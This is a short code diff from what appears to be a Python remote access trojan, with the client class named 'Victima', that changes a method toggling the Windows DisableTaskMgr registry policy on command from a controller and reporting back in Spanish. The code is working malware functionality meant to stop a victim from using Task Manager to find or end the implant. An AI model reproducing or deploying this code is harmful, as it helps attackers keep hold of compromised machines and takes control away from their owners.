@@ -236,25 +236,22 @@ class Victima(object):
 	def taskManagerDisable(self):	
 
 		self.enviar('ok')
+		self.recibir()
 
-		data = self.recibir()
+		if (plataforma=="win"):
 
-		if (data=="task_disable"):
+			verficar = subprocess.Popen('REG QUERY "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /s',shell=True,stdout=subprocess.PIPE)
 
-			if (plataforma=="win"):
+			if (b"DisableTaskMgr" not in verficar.stdout.read()):
 				os.system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /t REG_DWORD /d 1 /f")
 				self.enviar(" Administrador de tareas deshabilitado")
-
 			else:
-				self.enviar(" Este modulo no esta disponible.")
-
-		else:
-			if (plataforma=="win"):
 				os.system("REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /f")
 				self.enviar(" Administrador de tareas habilitado")
 
-			else:
-				self.enviar(" Este modulo no esta disponible.")
+		else:
+			self.enviar(" Este modulo no esta disponible.")
+
 
 		return
 
